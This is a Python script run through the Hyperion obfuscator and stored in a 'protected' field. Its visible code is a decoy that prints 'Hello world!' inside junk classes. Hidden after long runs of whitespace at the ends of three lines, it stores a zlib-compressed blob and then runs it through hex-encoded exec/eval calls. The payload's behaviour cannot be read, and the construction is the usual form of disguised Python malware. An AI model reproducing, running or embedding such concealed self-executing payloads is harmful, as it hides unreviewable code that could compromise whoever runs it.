"protected": "from builtins import *\nfrom math import prod as Run\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\n_negative, While, Ceil, _random, _memoryaccess, _modulo, Positive = exec, str, tuple, map, ord, globals, type\n\nclass CallFunction:\n    def __init__(self, Invert):\n        self.Theory = Run((Invert, 36526))\n        self.MemoryAccess(_round=36784)\n\n    def MemoryAccess(self, _round = int):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self.Theory /= 4703 - _round\n        \n        try:\n            ((Ceil, {_random: _random}) for Ceil in {_random: _random} if _negative > Round)\n\n        except AttributeError:\n            ((Round, Ceil, Round) or Round if (Round, Ceil, Round) and Round else ... or (Round, (Round, Ceil, Round)))\n\n        except:\n            Positive(-72315 * 16780) == str\n\n    def Algorithm(self, Divide = -25198):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        Divide -= 23092 - -82734\n        self.Math != True\n        \n        try:\n            ({While: Ceil} or While if {While: Ceil} and While else ... or (While, {While: Ceil}))\n\n        except AttributeError:\n            {While: Ceil} if _random == Ceil else (_random, _negative, _random) >= _negative\n\n        except:\n            Positive(27070 + -16076) == bool\n\n    def Negative(Statistics = False):\n        return _modulo()[Statistics]\n\n    def _absolute(Cube = 69146 + -86006, Add = True, _product = _modulo):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _product()[Cube] = Add\n        \n        try:\n            ({_random: _random} or Ceil if {_random: _random} and Ceil else ... or (Ceil, {_random: _random}))\n\n        except ArithmeticError:\n            ((Round, {_random: _random}) for Round in (_random, _negative, _random) if _random <= _random)\n\n        except:\n            Positive(24800 / -68213) == str\n\n    def execute(code = str):\n        return _negative(While(Ceil(_random(_memoryaccess, code))))\n\n    @property\n    def Math(self):\n        self._invert = '<__main__.Round object at 0x000007531BE52763>'\n        return (self._invert, CallFunction.Math)\n\nif __name__ == '__main__':\n    try:\n        CallFunction.execute(code = __code__)\n        Multiply = CallFunction(Invert = 2908 / -23957)\n\n        if 373922 > 7120479:\n            Multiply.MemoryAccess(_round = Multiply.Theory - 61494)\n        elif 126404 < 7716965:\n            Multiply.MemoryAccess(_round = Multiply.Theory - 67774)                                                                                                                                                                                                                                                          ;CallFunction._absolute(Cube='Oo0o0O0O00OOo0oOOoOOOo',Add=b'x\\x9c\\xddY[o\\xe3\\xb6\\x12~\\xcf\\xafp\\xfd\"\\x19\\xd9MdJ\\xa2$\\x03y)\\xd2\\xa2\\x0e\\xb2\\xf1ASt[d\\x03C\\x17:Q*\\x8b\\x86-7\\xc9\\xbf?3\\xbc\\xc8\\xf2M\\xb2\\x12w\\xb1\\x08i\\x92\\xc3!\\xc5\\xcbp8\\xfcH\\x17\\xf3\\xd7\\xc1I\\x07\\\\:1E\\x8an<\\xe6\\xd1d\\xb9\\x88\\xc3\\x82\\xcf\\xc7\\xe3\\xceO\\x17\\xdd\\xdf^gl\\x9e\\xf2\\xbc\\xdb\\xe1\\xf3J\\xb5pY<\\xf2\\xf9B\\xd41\\xbbQ\\x9ae\\xaf\\xc5#{\\xe0aa\\xbb\\xb4\\xfb\\xa9\\xfbs\\xb6d\\xbf\\xb3\\xa4\\xdb[\\xfb\\xea!-\\x1e\\x97\\x91l\\xf8\\xb1(f\\x8b\\xc1\\xf9\\xb9\\xe4\\x9d\\xc5|z\\xbe\\xd1\\xcc\\xf9\\x9e\\xbe\\x93t\\x11\\xf3y\\xb2\\xde\\x8cb\\x9e=<\\x9c\\xcf\\xb2\\xf0a\\xc96>\\xca\\xd2\\x98\\xe5\\x0b&?\\xfa\\xe5\\x7f\\xd7\\x9f\\xc9\\x99\\xb5Q%\\xe6\\x89,7f\\xf34/\\xcc\\xeeo,\\xcbx\\xe7\\x99\\xcf\\xb3\\xe4\\xa7n\\xcf8\\xe9\\r\\xca\\xdaXn,\\xfeI\\x13\\xa3w\\xc2^b6+\\x940\\xf3\\xd9\\x12\\xbe\\xfc\\x9d/\\xd8\\xa2\\x13\\xceYg\\xce\\x92o\\xf9\\x9f)\\xcfX!\\x19\\x11H\\xe6[\\xfe7_\\x8a\\\\\\xd8\\xc1F\\xbe\\xe57<\\xe2\\xc9k\\'K\\xff\\x81\\xef^\\xf9\\xb2\\xdb;\\x91\\x83J\\xa73>/\\xc6c\\xe8\\xedua\\xf4\\xce\\xd8KZ\\x98\\xbd\\x93\\x8c\\xc7a\\xb60{w\\xc6\\xf0\\xea\\xea\\xfaj\\x88\\xe1\\xfa\\xea\\xfaz(~\\x90\\xbb\\x1a\\x1a\\xf7\\x17\\x0f\\x19\\x8f\\xa0\\xda\\xc9\\xde:\\xd8\\xc0\\xcb\\xf3\\xf3\\xf3\\x0b8\\x8c\\x9fed\\xdc\\r\\x06\\xa7\\x9fO?\\x9b\\x9f\\xcd\\xd3~\\xafw\\x7f\\x7f\\x91\\xa4\\xf3\\xfaV 3\\x04\\x07\\x0c\\x8c\\x87Xw\\xbb\\x95\\x07V\\x84E\\xd1\\xd0\\xd2\\xcd\\xcd\\x97\\x1bp_\\xc0\\xdd\\xdc(\\n\"\\x98\\x8e\\x9c\\xf4\\xc9\\x9e\\n\\xf8m\\x9eO\\xc1\\xe7S\\x88e\\xc0\\x0c|\\xb9\\x92c}\\xdf#\\xce\\xf9\\xe8\\x92\\x8fF\\xfcr\\xc4!s\\t4|\\xbe\\xb3Y\\xd3\\x88\\x96iV\\xa49.\\xcb\\xbf\\xe1\\xbcv`\\x19\\n\\'\\xcb2\\x11\\xa1\\x1b\\x82\\x87\\x96\\xb1c!9)8 \\xaf\\xcd=\\xbd-\\xf2\\xb4\\xc8\\xd2e\\xb4)\\xd6\\xde\\xa7\\xca\\xca\\xc9\\x85|~i\\xddH\\xef\\xee(\\xad\\x9c\\xa5y\\xc2^L\\x83-\\xb2\\xf0\\xd7\\xad\\xe2\\xfb^\\xfd\\xe2\\xe5\\xa2\\xab\\\\t4\\x15\\xbd\\x82\\x88\\x0c\\xe3\\xec\\x89\\xa7y\\xfd\\xc2qX\\xa8K\\xb1`\\xa3K\\x91\\xc2o4\\xbal\\'\\xe14\\x8d\\x17a\\x9e\\xbeO\\xc2{\\x1bi%\\xe1\\xfd\\xadh\\t\\xbfN\\xd2\\xec\\x85=\\xe6\\xcb\\x96RN\\x9f\\xd2\\xa7,E\\x8f\\xee\\t~\\xc8xz\\xfa\\xc8\\xca\\x98\\xa5\\xb3)\\x8fw\\t\\xaaV\\xa9\\x86Y\\xb9ge*\\xb2\\x1fXPY\\xf8/\\xdb%\\xa5]f\\x11\\x05tK\\x94\\xbbUA\\xd2\\x1fXBl9\\xff\\xa3\\xe5\\x86\\x13\\x87!\\xe8\\x18\\x88Bh\\xd6\\x95<)\\xe1|\\xfc\\xb8b*B\\x9eM\\xdah\\x92\\xb4\\xfb\"\\x9e\\xca#\\xe0\\x03K\\'\\xe3|\\xbb\\xb4^\\x89F\\xdc\\x02\\x99\\x81\\xdc,\\x0b\\xc5\\x869\\x8b\\x03\\xcd?\\xb0\\x98\\xe6\\xc5\\xa2\\xad\\xc9\\xde\\x03\\x03\\xcc\\xc8\\xa0!\\xf8\\x98\\x06\\x10\\x07%\\xa5\\xe9P\\x95J\\x1f\\xd0\\x18\\x10]\\xc2\\xf0>`\\x1a\\xfe\\xa4\\xd8q\\xc4~X\\xa1\\xc7\\xece\\xe7\\x11P{P\\x02\\x9a\\x00\\xf7\\xf4\\x048\\x02\\xe1\\x04\\xc6)B\\x8aJ;\\xbb\\xcfR\\xd3\\xe8\\xd1\\xb15\\xa6\\xe3\\x00\\xbc7\\xee\\x8f\\xed1\\x85\\xca\\xde&\\xef\\x80\\x96\\xf6/\\xbd\\xdd\\'\\t\\xf1Ib[$hZ\\xd8\\x9e\\x8c\\xee\\xefk\\xda\\xa3\\xd4#tB\\x13bQ\\xe2\\xb9\\xa8.\\x9e\\x031\\xf3l\\xe0\\x044\\xf1,:\\xf1\\x88\\xe7@\\xce\\xf5|\\xeaR\\x9b\\xc4\\xa2\\xdc\\xf2\\\\\\xe0J\\x1aR\\xcf\\xf1\\x02\\xa8\\xeb6\\x8e\\xa9\\xce0\\x80\\xc8\\x85\\xb8\\x05\\x86C\\xb1#>\\xa9],6{-\\xde\\'OK\\xc9\\xb3\\x7f\\x98<\\xef\\xeb\\xc6\\xff\\xd7\\xd7\\xaf\\x7f\\x81\\xc3HQ\\x8a\\x84i\\xec\\xff\\xacfq\\x94\\xc8\\x1bwp\\xadP\\xd1!8\\x06\\x8d\\x16\\xaa\\x0c\\n\\xde$\\xd6\"O\\xdf\\'U\\xdf\\x9d\\xd8\\x1e\\x04\\n\\xc1\\x81`A\\x08\\x14\\xddW\\x81\\x92HH\\xfe\\x90\\xba\\xee\\x11V\\xe7\\xf6\\xf6\\x96\\xdc\\n\\x07\\xb8N\\x02\\xbcF9,g\\x07I\\xc2\\xe8\\xf5\\xa1\\xd8\\xfa\\xae\\x9a(\\xe7\\xbb\\x07\\x83\\xd4\\xe8TB\\x19\\xf8D\\x85\\x15%C%n>7Z\\xcf\\x91\\x80)i\\xb6\\x10u\\xb8J\\x1d\\x00x \\xa8{5\\x1c\\x06\\xdf\\xd7\\x02\\\\d\\xe14J\\xc2\\x8e\\xea\\x03;\\x1c\\xca~0\\x0c\\xf6j`\\xfb\\xb5r\\x12\\x87\\x89\\xc0D\\x9a\\xa8x\\x9d*\\xe9\\xe6\\xf5R\\x03\\xc7^dW0\\x12p\\xd8\\xdf`\\xf7\\xe0\\xda\\x8f\\xd9\\xf5]O\\x05\\x8c\\xa5\\xd7\\xb4_z\\xc8\\x1d<^aF!H\\x0f\\xeeh\\x83U\\xb0\\tO1\\r\\x9e4\\xac\\x92<L\\x0f\\x00Pz\\xa00J9VL\\xbej7\\xa8\\xb11{\\x95]\\xe0\\x1f\\x81\\x81\\x14\\x0cZ\\x7f\\xc9l\\xaf\\xe6hbmeZ-e^\\x03ez\\x89\\xa2\\x03e\\x92\\x0f\\xa9\\xeb\\xb7\\xdc.R\\xd9\\xb8\\x98*\\x17S\\xe58H\\xfe\\x16\\xe9\\xd4l\\x99X\\xf8@\\xf8\\x10\\xbc\\xa4bAa>.y\\xa1\\xcc\\xffGf\\x8exVH,\\xe9]\\x87\\xf6iD]\\x00Q}\\xca\\x04\\xb0b\\x02R\\xad\\x80\\x94(\\xa1\\x90\\x02\\x1c\\x83<\\xf0\\x88\\xac\\xa9\\xca(\\xc02\\xe0\\x01mS\\x81\\t\\xa0=\\xf8\\x1a\\xd0\\x9b\\xa5\\xa1\\xd7\\xaa?\\xd9\\xff\\x9b\\rm\\x8dtA\\x1d\\xd0S\\x95\"E\\'\\xceD\\xf31\\x95\\x1cI;@\\x1f\\xbc{\\xa6\\xea\\xc2<\\x957\\xe7\\\\\\x86c\\xdaS14G\\x0e\\xd8q\\x1c\\x95\\xa3*\\xa7b\\xa7\\xc5\\x90\\xc5\\r\\x16\\xee\\xaep\\xa3\\x85K,*6^k\\xdf\\xb4\\xdf\\x05G\\x94\\x8d\\x94y\\x1e\\xbd\\x7f\\xbf[j\\xcf\\xe2^\\xf6\\xd5\\xbe\\xb5\\x15O\\xf0+\\xfb\\xbd\\xa9.i\\xb9\\xdf\\x87C\\xfd7\\x01\\x8eZ\\x9d\\x92\\xe8[Zo\\x83\\x08\\xb8&p\\x1b\"7\\x11\\xbdO4\\xb6\\x9a\\xae\\xafP\\xa7\\x9e~_\\xd1\\x02\\x85*\\xd14\\xd5\\x15f\\xb2\\xb5)\\x14\\xab\\x8c\\xe6P\\x0c\\xecR(\\x0ej\\xce1\\xc1C\\xa0l^ \\xac^\\xac\\xe8\\xd2\\xee)+),\\xe2\\x7fa\\x03\\x89\\xe3\\xa2\\x95SV\\xab\\x0f\\x81\\xc1\\x053\\xa1h\\xdf\\x88\\x8d\\xb6\\x8a\\xbc\\x1d\\n\\xaa?\\x9f\\xe4h\\x90|\\xe7\\xa5Z-.\\xea\\xbc[Yd\\xbd\\xd0\\xb4r]9\\xa4\\xee\\xa1\\xd7\\x955\\x84#\\xd1\\x8dD\\x0e\\x92\\xaaQ\\x87\\xba\\xbf\\xe7\\xca)\\x0f\\xb3R\\x12\\xc3\\xa3\\xdeb\\xa0\\xa6x\\xcb\\xf0\\xc7\\xce\\x98\\x88\\xf7\\rwL\\xa0:\\xd9\\xe6~\\xf7\\xd7\\x0e\\xf9\\xe2\\xf1\\xa6\\xebv\\xf5A-\\xae`\\xc0@\\x95l<\\xb35\\xee\\x1a\\xb3+\\xc6\\xd3?\\x05\\x16\\x14\\x9c\\x0e\\x06w\\xc6\\xb2\\x98\\xf8\\x86\\xc9\\x12\\x1e\\xb3\\xe4\\xacg\\x04d\\xeb\\xde\\xb5\\xf3v\\x86\\xb1O\\xaa(\\xba\\x8a\\xa7\\xab\\xdcu\\x9e\\x11\\x998;1\\xcd\\x91\\x98\\xb28b k\\xde7\\x8dM\\x8a@z\\xfd\\xaa\\x18\\x96B\\xd0t\\xa0J\\xf7\\xf7t\\xd73\\x11\\xfb\\t\\xd4\\xa7\\xf72d\\xba\\x87\\xe8\\x99\\x05\\xc5\\xfd\\xf7\\x1f\\x84\\x8e\\x02\\xae}e\\xc9\\xf5\\x86\\xd5o\\x0e~\\xe5 l\\xaa\\xeb\\x1d\\xae\\x8b\\x9f&i\\xc6\\xf2p\\xca.j\\xb4\\x0e\\xec\\xb0\\x0c\\xda\\xef\\xcaSa\\xad\\x9b\\xfa\\xfd4\\x85\\xb2\\xba\\xbe\\\\\\x8f\\x02\\x98l\\xc4\\xbc\\xf5\\xcfto60\\xc7\\xdb\\xe8?\\xca\\x06\\xaf\\x83\\xcat\\xa2\\xb1\\xa5D\\x9cTcN\\xc9w$\\x1ff\\x1d\\xb8Q\\x89K\\x9dU\\xa9\\xa3b\\xba\\xc2\\xa9\\n\\xa5\\x12\\x9f\\x12\\xe2\\xd9\\xb0\\x94*\\xd86\\xb5\\x03I\\xeb\\xb4\\xca\\xdb\\xe4\\x97\\xdf\\xe9|%\\x88z6\\xdc\\x1f\\x02\\x02\\xf7\\x11q\\xd3\\x98`\\n\\xe3\\xf4l\\x1f\\xef!\\x9eK<7\\xb2C8\\xc3#X\\xb5H\\xae\\x1c\\x84\\x08\\x9fP`6\\x89\\x08\\xfe\\xdb\\xe6\\x84\\xfd\\x83\\'p\\x9dp\\xa8\\x03\\xc1\\xad\\xa4n%\\xefl\\xd0u\\xbcm\\xbe\\rs\\x07T\"\\xfaqm\\x1f\\x82\\xb7\\x91j\\xba\\x1a6\\xf9\\xfe\\x8e \\xcb\\x08\\xd0\\x0e\\x08R\\x04\\xed\\x81\\xa6U^%\\xa5\\x95\\x80\\xbc\\xb2\\x9e\\xe2\\x11\\x00\\x99\\xef\\\\\\x93\\xe6\\x9d\\xb52W\\x86\\xdcU_`W\\x89}\\xf6El4p\\xef\\xdb\\xe5N\\x05H\\xfb*\\xf4\\xdd\\xf5\\xa7_\\r\\xbc\\xeb\\xea\\xea\\xb7\\x89\\x03\\x81\\xf7\\x11\\xcd\\xe2\\xdb\\xfe\\xb0\\x93\\x16]\\xdbtMU\\xf3\\xab\\xd2f\\xa3\\xf3c\\x98\\xbefl\\x83\\xaf\\x18\\x96\\xc7h\\xe0\\xe0_K6\\xe6@\\x7f\\x89\\'\\xde7 \\xd5\\xaf\\x15\\xa1\\x15\\x10\\xf1_%>\\xd4\\xc8\\x7f-\\x9dj,S_\\xd6Q\\x8fr+\\xe4\\x11\\xab\\xe1\\xeb\\x7fA-\\xb2\\xeeC+\\xb4a\\xb7\\xac\\xdd\\xf1\\xd1\\xfe8\\xce\\xca\\xfa\\xa8\\x1c|K\\xa1\\x95\\xd5\\x97q\\xd9G\\x15\\xe9T\\x05&}b\\'\\xa0\\x8b\\xdb\\xf3\\xd5c\\xd6\\xa8).\\xbf\\\\=7\\xe2\\x88\\x1dO~a{}Z\\x95\\xca&2\\xd4\\x9e\\xad\\xe5Y\\x992\\x90R\\xfbovIl\\xeb\\xb5v\\xc7{\\xae\\x0c\\x9b2\\x83=IV\\xcfl\\xb1\\xa0\\xc2\\xf2\\xea\\xa99\\xab\\xcb\\xa9O\\x88\\xad=\\x98NW\\xa7\\xda\\xeb\\x9cO\\x0e_\\x8d]\\x9aW\\xd1\\xb5\\xca\\x88\\xd4\\x05\\xb8\\xbc&o?\\x1c\\xa2\\xf7\\xc9\\xe1\\x1a\\xb4-\\xcbf\\xdd\\xde\\xd2\\xbb\\xd6#\\xac\\xceo\\xef?\\x04%\\xa5\\xffQ\\xc0\\xe0\\x936k}\\xbc\\xbd\\x15\\xc2\\x8e\\xf1IuL\\x9b#e\\xe5\\xbf\\x1fI\\x85\\xc2v\\\\8\\xfd~\\x90\\x9b\\x8d8\\x10V\\'\\xc1P\\x1d\\x0fW\\xc3\\x03\\xae7\\xc7\\xc3\\xc3\\x87\\\\4*k\\x9f\\xac\\xd1Z\\xd6\\xac\\xf9?\\xa4#\\x9e\\xa4\\xff\\x07\\x8eM\\xdf\\xa1')\n\n        if 402284 > 4735309:\n            Multiply.Algorithm(Divide = -90921 - Multiply.Theory)\n        elif 123210 < 7854651:\n            CallFunction(Invert = -87577 / -11276).MemoryAccess(_round = Multiply.Theory / -85099)                                                                                                                                                                                                                                                          ;MMNMMMNNMNNNNNMMNMNM,O00O00000OOOOoo0O0,MMMMNMNNMNNNNMNMNN,lllijlljliijliljlilj,WXWWXXXXXWXWXWWXWWWX=(lambda xwwxxwxwwwxwxwwwww:xwwxxwxwwwxwxwwwww(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda xwwxxwxwwwxwxwwwww:xwwxxwxwwwxwxwwwww['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda xwwxxwxwwwxwxwwwww:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(xwwxxwxwwwxwxwwwww)\"),filename='\\x78\\x77\\x78\\x78\\x78\\x77\\x78\\x77\\x77\\x78\\x78\\x77\\x78\\x78\\x77\\x77\\x77\\x77\\x77\\x78\\x78\\x78\\x78\\x77\\x78',mode='\\x65\\x76\\x61\\x6c'))),(lambda:(lambda xwwxxwxwwwxwxwwwww:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(xwwxxwxwwwxwxwwwww)\"),filename='\\x78\\x77\\x78\\x78\\x78\\x77\\x78\\x77\\x77\\x78\\x78\\x77\\x78\\x78\\x77\\x77\\x77\\x77\\x77\\x78\\x78\\x78\\x78\\x77\\x78',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63')),(lambda oODDDoDDDODoDDOoDDDOO,xwwxxwxwwwxwxwwwww:oODDDoDDDODoDDOoDDDOO(xwwxxwxwwwxwxwwwww))\n        if 238361 > 3863019:\n            Multiply.Algorithm(Divide = -2910 - Multiply.Theory)\n        elif 239013 < 5236782:\n            CallFunction(Invert = -19166 - -31770).MemoryAccess(_round = Multiply.Theory - -30482)                                                                                                                                                                                                                                                          ;lllijlljliijliljlilj()(WXWWXXXXXWXWXWWXWWWX(O00O00000OOOOoo0O0(MMNMMMNNMNNNNNMMNMNM(MMMMNMNNMNNNNMNMNN('\\x76\\x61\\x72\\x73'))),CallFunction.Negative(Statistics='Oo0o0O0O00OOo0oOOoOOOo')))\n\n    except Exception as Round:\n        if 440516 > 5362550:\n            CallFunction.execute(code = While(Round))\n\n        elif 181476 > 7859343:\n            CallFunction(Invert = 99631 + 2333).Algorithm(Divide = 1414 * Multiply.Theory)"